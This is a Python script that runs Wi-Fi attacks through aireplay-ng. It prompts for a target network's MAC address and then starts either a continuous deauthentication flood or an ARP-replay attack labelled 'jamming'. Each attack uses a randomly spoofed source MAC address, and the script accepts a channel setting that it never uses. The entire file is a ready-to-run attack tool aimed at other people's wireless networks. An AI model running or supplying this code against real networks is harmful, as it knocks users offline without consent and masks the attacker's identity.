import os
import subprocess
import random

def generate_random_mac():
    # Generate a random MAC address
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

def deauth_attack(mac_address, channel):
    # Deauthentication attack using aireplay-ng with MAC spoofing
    spoofed_mac = generate_random_mac()
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", mac_address, "-h", spoofed_mac, "wlan0"])

def jamming_attack(mac_address, channel):
    # WiFi jamming attack using aireplay-ng with MAC spoofing
    spoofed_mac = generate_random_mac()
    subprocess.run(["sudo", "aireplay-ng", "--arpreplay", "-a", mac_address, "--ignore-negative-one", "-D", "-h", spoofed_mac, "wlan0"])

def main():
    # User prompt for attack type
    attack_type = input("Select attack type (deauth/jamming): ").lower()

    # User prompt for target WiFi details
    target_mac = input("Enter target WiFi MAC address: ")
    target_channel = input("Enter target WiFi channel: ")

    # Execute the chosen attack
    if attack_type == "deauth":
        deauth_attack(target_mac, target_channel)
    elif attack_type == "jamming":
        jamming_attack(target_mac, target_channel)
    else:
        print("Invalid attack type. Please choose either 'deauth' or 'jamming'.")

if __name__ == "__main__":
    main()
